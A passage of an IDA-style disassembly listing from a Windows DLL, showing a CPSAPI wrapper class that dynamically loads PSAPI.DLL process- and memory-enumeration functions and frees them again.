		lea	ecx, [ebp+var_34]
		call	Ordinal751
		mov	eax, [ebp+arg_4]
		and	[ebp+var_4], 0
		push	dword ptr [eax]	; psz
		mov	ecx, [ebp+arg_0]
		mov	byte ptr [ebp+var_4], 1
		call	sub_6AF477BF

loc_6AF4784D:				; DATA XREF: sub_6AF47876+3Do
		lea	ecx, [ebp+var_34]
		call	Ordinal753
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_34]
		neg	esi
		call	Ordinal752
		mov	ecx, [ebp+var_C]
		pop	edi
		mov	eax, esi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn
Ordinal959	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF47876	proc near		; DATA XREF: .rdata:6AF63A58o
		push	14h
		lea	ecx, [ebp-34h]
		call	Ordinal649
		push	offset a_com_error ; "_com_error"
		lea	ecx, [ebp-34h]
		call	Ordinal762
		mov	ecx, [ebp-14h]
		call	sub_6AF47470
		push	eax		; Src
		lea	ecx, [ebp-34h]
		call	Ordinal764
		lea	ecx, [ebp-34h]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF4784D
		retn
sub_6AF47876	endp

; Exported entry 979.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal979
Ordinal979	proc near		; CODE XREF: Ordinal974+12p
					; Ordinal978+5p
					; DATA XREF: ...

arg_0		= dword	ptr  4

		push	esi
		push	edi
		xor	edi, edi
		cmp	[esp+8+arg_0], edi
		mov	esi, ecx
		jz	short loc_6AF478D2
		call	Ordinal753
		test	eax, eax
		jz	loc_6AF47B24

loc_6AF478D2:				; CODE XREF: Ordinal979+Aj
		push	ebx
		xor	ebx, ebx
		inc	ebx
		cmp	[esp+0Ch+arg_0], edi
		jnz	short loc_6AF47929
		mov	[esi+8], edi
		mov	[esi+0Ch], edi
		mov	[esi+10h], edi
		mov	[esi+14h], edi
		mov	[esi+18h], edi
		mov	[esi+1Ch], edi
		mov	[esi+20h], edi
		mov	[esi+24h], edi
		mov	[esi+28h], edi
		mov	[esi+2Ch], edi
		mov	[esi+30h], edi
		mov	[esi+34h], edi
		mov	[esi+38h], edi
		mov	[esi+3Ch], edi
		mov	[esi+40h], edi
		mov	[esi+44h], edi
		mov	[esi+48h], edi
		mov	[esi+4Ch], edi
		mov	[esi+50h], edi
		mov	[esi+54h], edi
		mov	[esi+58h], edi
		mov	[esi+5Ch], edi
		mov	[esi+60h], edi
		mov	[esi+64h], edi
		jmp	loc_6AF47B21
; ---------------------------------------------------------------------------

loc_6AF47929:				; CODE XREF: Ordinal979+21j
		push	offset aEmptyworkingse ; "EmptyWorkingSet"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+8], eax
		jnz	short loc_6AF4793E
		xor	ebx, ebx

loc_6AF4793E:				; CODE XREF: Ordinal979+81j
		push	offset aEnumdevicedriv ; "EnumDeviceDrivers"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+0Ch], eax
		jnz	short loc_6AF47953
		xor	ebx, ebx

loc_6AF47953:				; CODE XREF: Ordinal979+96j
		push	offset aEnumpagefilesa ; "EnumPageFilesA"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+10h], eax
		jnz	short loc_6AF47968
		xor	ebx, ebx

loc_6AF47968:				; CODE XREF: Ordinal979+ABj
		push	offset aEnumpagefilesw ; "EnumPageFilesW"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+14h], eax
		jnz	short loc_6AF4797D
		xor	ebx, ebx

loc_6AF4797D:				; CODE XREF: Ordinal979+C0j
		push	offset aEnumprocesses ;	"EnumProcesses"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+18h], eax
		jnz	short loc_6AF47992
		xor	ebx, ebx

loc_6AF47992:				; CODE XREF: Ordinal979+D5j
		push	offset aEnumprocessmod ; "EnumProcessModules"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+1Ch], eax
		jnz	short loc_6AF479A7
		xor	ebx, ebx

loc_6AF479A7:				; CODE XREF: Ordinal979+EAj
		push	offset aGetdevicedrive ; "GetDeviceDriverBaseNameA"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+20h], eax
		jnz	short loc_6AF479BC
		xor	ebx, ebx

loc_6AF479BC:				; CODE XREF: Ordinal979+FFj
		push	offset aGetdevicedri_0 ; "GetDeviceDriverBaseNameW"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+24h], eax
		jnz	short loc_6AF479D1
		xor	ebx, ebx

loc_6AF479D1:				; CODE XREF: Ordinal979+114j
		push	offset aGetdevicedri_1 ; "GetDeviceDriverFileNameA"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+28h], eax
		jnz	short loc_6AF479E6
		xor	ebx, ebx

loc_6AF479E6:				; CODE XREF: Ordinal979+129j
		push	offset aGetdevicedri_2 ; "GetDeviceDriverFileNameW"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+2Ch], eax
		jnz	short loc_6AF479FB
		xor	ebx, ebx

loc_6AF479FB:				; CODE XREF: Ordinal979+13Ej
		push	offset aGetmappedfilen ; "GetMappedFileNameA"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+30h], eax
		jnz	short loc_6AF47A10
		xor	ebx, ebx

loc_6AF47A10:				; CODE XREF: Ordinal979+153j
		push	offset aGetmappedfil_0 ; "GetMappedFileNameW"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+34h], eax
		jnz	short loc_6AF47A25
		xor	ebx, ebx

loc_6AF47A25:				; CODE XREF: Ordinal979+168j
		push	offset aGetmodulebasen ; "GetModuleBaseNameA"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+38h], eax
		jnz	short loc_6AF47A3A
		xor	ebx, ebx

loc_6AF47A3A:				; CODE XREF: Ordinal979+17Dj
		push	offset aGetmodulebas_0 ; "GetModuleBaseNameW"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+3Ch], eax
		jnz	short loc_6AF47A4F
		xor	ebx, ebx

loc_6AF47A4F:				; CODE XREF: Ordinal979+192j
		push	offset aGetmodulefilen ; "GetModuleFileNameExA"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+40h], eax
		jnz	short loc_6AF47A64
		xor	ebx, ebx

loc_6AF47A64:				; CODE XREF: Ordinal979+1A7j
		push	offset aGetmodulefil_0 ; "GetModuleFileNameExW"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+44h], eax
		jnz	short loc_6AF47A79
		xor	ebx, ebx

loc_6AF47A79:				; CODE XREF: Ordinal979+1BCj
		push	offset aGetmoduleinfor ; "GetModuleInformation"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+48h], eax
		jnz	short loc_6AF47A8E
		xor	ebx, ebx

loc_6AF47A8E:				; CODE XREF: Ordinal979+1D1j
		push	offset aGetperformance ; "GetPerformanceInfo"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+4Ch], eax
		jnz	short loc_6AF47AA3
		xor	ebx, ebx

loc_6AF47AA3:				; CODE XREF: Ordinal979+1E6j
		push	offset aGetprocessimag ; "GetProcessImageFileNameA"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+50h], eax
		jnz	short loc_6AF47AB8
		xor	ebx, ebx

loc_6AF47AB8:				; CODE XREF: Ordinal979+1FBj
		push	offset aGetprocessim_0 ; "GetProcessImageFileNameW"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+54h], eax
		jnz	short loc_6AF47ACD
		xor	ebx, ebx

loc_6AF47ACD:				; CODE XREF: Ordinal979+210j
		push	offset aGetprocessmemo ; "GetProcessMemoryInfo"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+58h], eax
		jnz	short loc_6AF47AE2
		xor	ebx, ebx

loc_6AF47AE2:				; CODE XREF: Ordinal979+225j
		push	offset aGetwschanges ; "GetWsChanges"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+5Ch], eax
		jnz	short loc_6AF47AF7
		xor	ebx, ebx

loc_6AF47AF7:				; CODE XREF: Ordinal979+23Aj
		push	offset aInitializeproc ; "InitializeProcessForWsWatch"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+60h], eax
		jnz	short loc_6AF47B0C
		xor	ebx, ebx

loc_6AF47B0C:				; CODE XREF: Ordinal979+24Fj
		push	offset aQueryworkingse ; "QueryWorkingSet"
		mov	ecx, esi
		call	Ordinal899
		cmp	eax, edi
		mov	[esi+64h], eax
		jnz	short loc_6AF47B21
		xor	ebx, ebx

loc_6AF47B21:				; CODE XREF: Ordinal979+6Bj
					; Ordinal979+264j
		mov	eax, ebx
		pop	ebx

loc_6AF47B24:				; CODE XREF: Ordinal979+13j
		pop	edi
		pop	esi
		retn	4
Ordinal979	endp

; Exported entry 974.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal974
Ordinal974	proc near		; CODE XREF: Ordinal1346+Cp
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal889
		push	0
		mov	ecx, esi
		mov	dword ptr [esi], offset	off_6AF5D758
		call	Ordinal979
		mov	eax, esi
		pop	esi
		retn
Ordinal974	endp

; Exported entry 976.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal976(LPCSTR Args)
		public Ordinal976
Ordinal976	proc near		; CODE XREF: Ordinal980+29p
					; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4

		push	esi
		push	[esp+4+Args]	; Args
		mov	esi, ecx
		call	Ordinal896
		test	eax, eax
		jz	short loc_6AF47B5F
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF47B66

loc_6AF47B5F:				; CODE XREF: Ordinal976+Ej
		xor	eax, eax
		jmp	loc_6AF47D65
; ---------------------------------------------------------------------------

loc_6AF47B66:				; CODE XREF: Ordinal976+19j
		push	edi
		xor	edi, edi
		push	offset aEmptyworkingse ; "EmptyWorkingSet"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF47B7F
		xor	edi, edi

loc_6AF47B7F:				; CODE XREF: Ordinal976+37j
		push	offset aEnumdevicedriv ; "EnumDeviceDrivers"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+0Ch], eax
		jnz	short loc_6AF47B94
		xor	edi, edi

loc_6AF47B94:				; CODE XREF: Ordinal976+4Cj
		push	offset aEnumpagefilesa ; "EnumPageFilesA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+10h], eax
		jnz	short loc_6AF47BA9
		xor	edi, edi

loc_6AF47BA9:				; CODE XREF: Ordinal976+61j
		push	offset aEnumpagefilesw ; "EnumPageFilesW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+14h], eax
		jnz	short loc_6AF47BBE
		xor	edi, edi

loc_6AF47BBE:				; CODE XREF: Ordinal976+76j
		push	offset aEnumprocesses ;	"EnumProcesses"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+18h], eax
		jnz	short loc_6AF47BD3
		xor	edi, edi

loc_6AF47BD3:				; CODE XREF: Ordinal976+8Bj
		push	offset aEnumprocessmod ; "EnumProcessModules"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+1Ch], eax
		jnz	short loc_6AF47BE8
		xor	edi, edi

loc_6AF47BE8:				; CODE XREF: Ordinal976+A0j
		push	offset aGetdevicedrive ; "GetDeviceDriverBaseNameA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+20h], eax
		jnz	short loc_6AF47BFD
		xor	edi, edi

loc_6AF47BFD:				; CODE XREF: Ordinal976+B5j
		push	offset aGetdevicedri_0 ; "GetDeviceDriverBaseNameW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+24h], eax
		jnz	short loc_6AF47C12
		xor	edi, edi

loc_6AF47C12:				; CODE XREF: Ordinal976+CAj
		push	offset aGetdevicedri_1 ; "GetDeviceDriverFileNameA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+28h], eax
		jnz	short loc_6AF47C27
		xor	edi, edi

loc_6AF47C27:				; CODE XREF: Ordinal976+DFj
		push	offset aGetdevicedri_2 ; "GetDeviceDriverFileNameW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+2Ch], eax
		jnz	short loc_6AF47C3C
		xor	edi, edi

loc_6AF47C3C:				; CODE XREF: Ordinal976+F4j
		push	offset aGetmappedfilen ; "GetMappedFileNameA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+30h], eax
		jnz	short loc_6AF47C51
		xor	edi, edi

loc_6AF47C51:				; CODE XREF: Ordinal976+109j
		push	offset aGetmappedfil_0 ; "GetMappedFileNameW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+34h], eax
		jnz	short loc_6AF47C66
		xor	edi, edi

loc_6AF47C66:				; CODE XREF: Ordinal976+11Ej
		push	offset aGetmodulebasen ; "GetModuleBaseNameA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+38h], eax
		jnz	short loc_6AF47C7B
		xor	edi, edi

loc_6AF47C7B:				; CODE XREF: Ordinal976+133j
		push	offset aGetmodulebas_0 ; "GetModuleBaseNameW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+3Ch], eax
		jnz	short loc_6AF47C90
		xor	edi, edi

loc_6AF47C90:				; CODE XREF: Ordinal976+148j
		push	offset aGetmodulefilen ; "GetModuleFileNameExA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+40h], eax
		jnz	short loc_6AF47CA5
		xor	edi, edi

loc_6AF47CA5:				; CODE XREF: Ordinal976+15Dj
		push	offset aGetmodulefil_0 ; "GetModuleFileNameExW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+44h], eax
		jnz	short loc_6AF47CBA
		xor	edi, edi

loc_6AF47CBA:				; CODE XREF: Ordinal976+172j
		push	offset aGetmoduleinfor ; "GetModuleInformation"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+48h], eax
		jnz	short loc_6AF47CCF
		xor	edi, edi

loc_6AF47CCF:				; CODE XREF: Ordinal976+187j
		push	offset aGetperformance ; "GetPerformanceInfo"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+4Ch], eax
		jnz	short loc_6AF47CE4
		xor	edi, edi

loc_6AF47CE4:				; CODE XREF: Ordinal976+19Cj
		push	offset aGetprocessimag ; "GetProcessImageFileNameA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+50h], eax
		jnz	short loc_6AF47CF9
		xor	edi, edi

loc_6AF47CF9:				; CODE XREF: Ordinal976+1B1j
		push	offset aGetprocessim_0 ; "GetProcessImageFileNameW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+54h], eax
		jnz	short loc_6AF47D0E
		xor	edi, edi

loc_6AF47D0E:				; CODE XREF: Ordinal976+1C6j
		push	offset aGetprocessmemo ; "GetProcessMemoryInfo"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+58h], eax
		jnz	short loc_6AF47D23
		xor	edi, edi

loc_6AF47D23:				; CODE XREF: Ordinal976+1DBj
		push	offset aGetwschanges ; "GetWsChanges"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+5Ch], eax
		jnz	short loc_6AF47D38
		xor	edi, edi

loc_6AF47D38:				; CODE XREF: Ordinal976+1F0j
		push	offset aInitializeproc ; "InitializeProcessForWsWatch"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+60h], eax
		jnz	short loc_6AF47D4D
		xor	edi, edi

loc_6AF47D4D:				; CODE XREF: Ordinal976+205j
		push	offset aQueryworkingse ; "QueryWorkingSet"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+64h], eax
		jnz	short loc_6AF47D62
		xor	edi, edi

loc_6AF47D62:				; CODE XREF: Ordinal976+21Aj
		mov	eax, edi
		pop	edi

loc_6AF47D65:				; CODE XREF: Ordinal976+1Dj
		pop	esi
		retn	4
Ordinal976	endp

; Exported entry 977.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal977(LPCSTR Args,	DWORD dwFlags)
		public Ordinal977
Ordinal977	proc near		; DATA XREF: .rdata:off_6AF66098o

Args		= dword	ptr  4
dwFlags		= dword	ptr  8

		push	esi
		push	[esp+4+dwFlags]	; dwFlags
		mov	esi, ecx
		push	[esp+8+Args]	; Args
		call	Ordinal897
		test	eax, eax
		jz	short loc_6AF47D88
		mov	ecx, esi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF47D8F

loc_6AF47D88:				; CODE XREF: Ordinal977+12j
		xor	eax, eax
		jmp	loc_6AF47F8E
; ---------------------------------------------------------------------------

loc_6AF47D8F:				; CODE XREF: Ordinal977+1Dj
		push	edi
		xor	edi, edi
		push	offset aEmptyworkingse ; "EmptyWorkingSet"
		mov	ecx, esi
		inc	edi
		call	Ordinal899
		test	eax, eax
		mov	[esi+8], eax
		jnz	short loc_6AF47DA8
		xor	edi, edi

loc_6AF47DA8:				; CODE XREF: Ordinal977+3Bj
		push	offset aEnumdevicedriv ; "EnumDeviceDrivers"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+0Ch], eax
		jnz	short loc_6AF47DBD
		xor	edi, edi

loc_6AF47DBD:				; CODE XREF: Ordinal977+50j
		push	offset aEnumpagefilesa ; "EnumPageFilesA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+10h], eax
		jnz	short loc_6AF47DD2
		xor	edi, edi

loc_6AF47DD2:				; CODE XREF: Ordinal977+65j
		push	offset aEnumpagefilesw ; "EnumPageFilesW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+14h], eax
		jnz	short loc_6AF47DE7
		xor	edi, edi

loc_6AF47DE7:				; CODE XREF: Ordinal977+7Aj
		push	offset aEnumprocesses ;	"EnumProcesses"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+18h], eax
		jnz	short loc_6AF47DFC
		xor	edi, edi

loc_6AF47DFC:				; CODE XREF: Ordinal977+8Fj
		push	offset aEnumprocessmod ; "EnumProcessModules"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+1Ch], eax
		jnz	short loc_6AF47E11
		xor	edi, edi

loc_6AF47E11:				; CODE XREF: Ordinal977+A4j
		push	offset aGetdevicedrive ; "GetDeviceDriverBaseNameA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+20h], eax
		jnz	short loc_6AF47E26
		xor	edi, edi

loc_6AF47E26:				; CODE XREF: Ordinal977+B9j
		push	offset aGetdevicedri_0 ; "GetDeviceDriverBaseNameW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+24h], eax
		jnz	short loc_6AF47E3B
		xor	edi, edi

loc_6AF47E3B:				; CODE XREF: Ordinal977+CEj
		push	offset aGetdevicedri_1 ; "GetDeviceDriverFileNameA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+28h], eax
		jnz	short loc_6AF47E50
		xor	edi, edi

loc_6AF47E50:				; CODE XREF: Ordinal977+E3j
		push	offset aGetdevicedri_2 ; "GetDeviceDriverFileNameW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+2Ch], eax
		jnz	short loc_6AF47E65
		xor	edi, edi

loc_6AF47E65:				; CODE XREF: Ordinal977+F8j
		push	offset aGetmappedfilen ; "GetMappedFileNameA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+30h], eax
		jnz	short loc_6AF47E7A
		xor	edi, edi

loc_6AF47E7A:				; CODE XREF: Ordinal977+10Dj
		push	offset aGetmappedfil_0 ; "GetMappedFileNameW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+34h], eax
		jnz	short loc_6AF47E8F
		xor	edi, edi

loc_6AF47E8F:				; CODE XREF: Ordinal977+122j
		push	offset aGetmodulebasen ; "GetModuleBaseNameA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+38h], eax
		jnz	short loc_6AF47EA4
		xor	edi, edi

loc_6AF47EA4:				; CODE XREF: Ordinal977+137j
		push	offset aGetmodulebas_0 ; "GetModuleBaseNameW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+3Ch], eax
		jnz	short loc_6AF47EB9
		xor	edi, edi

loc_6AF47EB9:				; CODE XREF: Ordinal977+14Cj
		push	offset aGetmodulefilen ; "GetModuleFileNameExA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+40h], eax
		jnz	short loc_6AF47ECE
		xor	edi, edi

loc_6AF47ECE:				; CODE XREF: Ordinal977+161j
		push	offset aGetmodulefil_0 ; "GetModuleFileNameExW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+44h], eax
		jnz	short loc_6AF47EE3
		xor	edi, edi

loc_6AF47EE3:				; CODE XREF: Ordinal977+176j
		push	offset aGetmoduleinfor ; "GetModuleInformation"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+48h], eax
		jnz	short loc_6AF47EF8
		xor	edi, edi

loc_6AF47EF8:				; CODE XREF: Ordinal977+18Bj
		push	offset aGetperformance ; "GetPerformanceInfo"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+4Ch], eax
		jnz	short loc_6AF47F0D
		xor	edi, edi

loc_6AF47F0D:				; CODE XREF: Ordinal977+1A0j
		push	offset aGetprocessimag ; "GetProcessImageFileNameA"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+50h], eax
		jnz	short loc_6AF47F22
		xor	edi, edi

loc_6AF47F22:				; CODE XREF: Ordinal977+1B5j
		push	offset aGetprocessim_0 ; "GetProcessImageFileNameW"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+54h], eax
		jnz	short loc_6AF47F37
		xor	edi, edi

loc_6AF47F37:				; CODE XREF: Ordinal977+1CAj
		push	offset aGetprocessmemo ; "GetProcessMemoryInfo"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+58h], eax
		jnz	short loc_6AF47F4C
		xor	edi, edi

loc_6AF47F4C:				; CODE XREF: Ordinal977+1DFj
		push	offset aGetwschanges ; "GetWsChanges"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+5Ch], eax
		jnz	short loc_6AF47F61
		xor	edi, edi

loc_6AF47F61:				; CODE XREF: Ordinal977+1F4j
		push	offset aInitializeproc ; "InitializeProcessForWsWatch"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+60h], eax
		jnz	short loc_6AF47F76
		xor	edi, edi

loc_6AF47F76:				; CODE XREF: Ordinal977+209j
		push	offset aQueryworkingse ; "QueryWorkingSet"
		mov	ecx, esi
		call	Ordinal899
		test	eax, eax
		mov	[esi+64h], eax
		jnz	short loc_6AF47F8B
		xor	edi, edi

loc_6AF47F8B:				; CODE XREF: Ordinal977+21Ej
		mov	eax, edi
		pop	edi

loc_6AF47F8E:				; CODE XREF: Ordinal977+21j
		pop	esi
		retn	8
Ordinal977	endp

; Exported entry 978.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal978
Ordinal978	proc near		; CODE XREF: Ordinal981j Ordinal975+9p ...
		push	esi
		push	0
		mov	esi, ecx
		call	Ordinal979
		mov	ecx, esi
		pop	esi
		jmp	Ordinal898
Ordinal978	endp

; Exported entry 981.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal981
Ordinal981	proc near		; CODE XREF: Ordinal1349+6p
					; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal978
Ordinal981	endp

; Exported entry 975.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal975
Ordinal975	proc near		; CODE XREF: sub_6AF48113+3p
					; Ordinal1347+22j
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5D758
		call	Ordinal978
		mov	ecx, esi
		pop	esi
		jmp	Ordinal891
Ordinal975	endp

; Exported entry 980.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame fpd=88h

		public Ordinal980
Ordinal980	proc near		; CODE XREF: Ordinal1348+Fp
					; DATA XREF: .rdata:off_6AF66098o

var_108		= byte ptr -108h
var_4		= dword	ptr -4

		push	ebp
		lea	ebp, [esp-88h]
		sub	esp, 108h
		mov	eax, ___security_cookie
		push	esi
		push	edi
		mov	[ebp+88h+var_4], eax
		mov	esi, ecx
		call	Ordinal978
		push	offset aPsapi_dll ; "PSAPI.DLL"
		mov	ecx, esi
		call	Ordinal976
		test	eax, eax
		jnz	loc_6AF480E7
		xor	edi, edi
		cmp	[esi+8], edi
		jz	loc_6AF480FF
		cmp	[esi+0Ch], edi
		jz	loc_6AF480FF
		cmp	[esi+18h], edi
		jz	loc_6AF480FF
		cmp	[esi+1Ch], edi
		jz	loc_6AF480FF
		cmp	[esi+20h], edi
		jz	loc_6AF480FF
		cmp	[esi+24h], edi
		jz	loc_6AF480FF
		cmp	[esi+28h], edi
		jz	loc_6AF480FF
		cmp	[esi+2Ch], edi
		jz	loc_6AF480FF
		cmp	[esi+30h], edi
		jz	loc_6AF480FF
		cmp	[esi+34h], edi
		jz	loc_6AF480FF
		cmp	[esi+38h], edi
		jz	loc_6AF480FF
		cmp	[esi+3Ch], edi
		jz	loc_6AF480FF
		cmp	[esi+40h], edi
		jz	loc_6AF480FF
		cmp	[esi+44h], edi
		jz	loc_6AF480FF
		cmp	[esi+48h], edi
		jz	loc_6AF480FF
		cmp	[esi+58h], edi
		jz	short loc_6AF480FF
		cmp	[esi+5Ch], edi
		jz	short loc_6AF480FF
		cmp	[esi+60h], edi
		jz	short loc_6AF480FF
		cmp	[esi+64h], edi
		jz	short loc_6AF480FF
		lea	ecx, [ebp+88h+var_108]
		call	Ordinal932
		cmp	[esi+4Ch], edi
		jz	short loc_6AF480B3
		cmp	[esi+10h], edi
		jz	short loc_6AF480B3
		cmp	[esi+14h], edi
		jz	short loc_6AF480B3
		cmp	[esi+50h], edi
		jz	short loc_6AF480B3
		cmp	[esi+54h], edi
		jnz	short loc_6AF480DF

loc_6AF480B3:				; CODE XREF: Ordinal980+DEj
					; Ordinal980+E3j ...
		push	1
		lea	ecx, [ebp+88h+var_108]
		call	Ordinal946
		test	eax, eax
		jz	short loc_6AF480DF
		push	offset aCpsapiCreateLo ; "CPSAPI::Create() : Load() == FALSE\n"
		call	sub_6AF3102E
		pop	ecx
		mov	ecx, esi
		call	Ordinal978
		lea	ecx, [ebp+88h+var_108]
		call	Ordinal933

loc_6AF480DB:				; CODE XREF: Ordinal980+152j
		xor	eax, eax
		jmp	short loc_6AF480EA
; ---------------------------------------------------------------------------

loc_6AF480DF:				; CODE XREF: Ordinal980+F2j
					; Ordinal980+100j
		lea	ecx, [ebp+88h+var_108]
		call	Ordinal933

loc_6AF480E7:				; CODE XREF: Ordinal980+30j
		xor	eax, eax
		inc	eax

loc_6AF480EA:				; CODE XREF: Ordinal980+11Ej
		mov	ecx, [ebp+88h+var_4]
		pop	edi
		pop	esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		add	ebp, 88h
		leave
		retn
; ---------------------------------------------------------------------------

loc_6AF480FF:				; CODE XREF: Ordinal980+3Bj
					; Ordinal980+44j ...
		push	offset aCpsapiCreateLo ; "CPSAPI::Create() : Load() == FALSE\n"
		call	sub_6AF3102E
		pop	ecx
		mov	ecx, esi
		call	Ordinal978
		jmp	short loc_6AF480DB
Ordinal980	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF48113(void *, char)
sub_6AF48113	proc near		; DATA XREF: .rdata:off_6AF5D758o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal975
		test	[esp+4+arg_0], 1
		jz	short loc_6AF48129
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF48129:				; CODE XREF: sub_6AF48113+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF48113	endp

; Exported entry 982.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal982
Ordinal982	proc near		; CODE XREF: Ordinal554+3p
					; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		and	dword ptr [eax+4], 0
		and	dword ptr [eax+8], 0
		mov	dword ptr [eax], offset	off_6AF5D78C
		mov	dword_6AF68260,	eax
		retn
Ordinal982	endp

; Exported entry 985.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal985
Ordinal985	proc near		; CODE XREF: Ordinal563+23p
					; Ordinal983+6p ...
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+8], 0
		jz	short loc_6AF48158
		push	dword ptr [esi+4] ; Handler
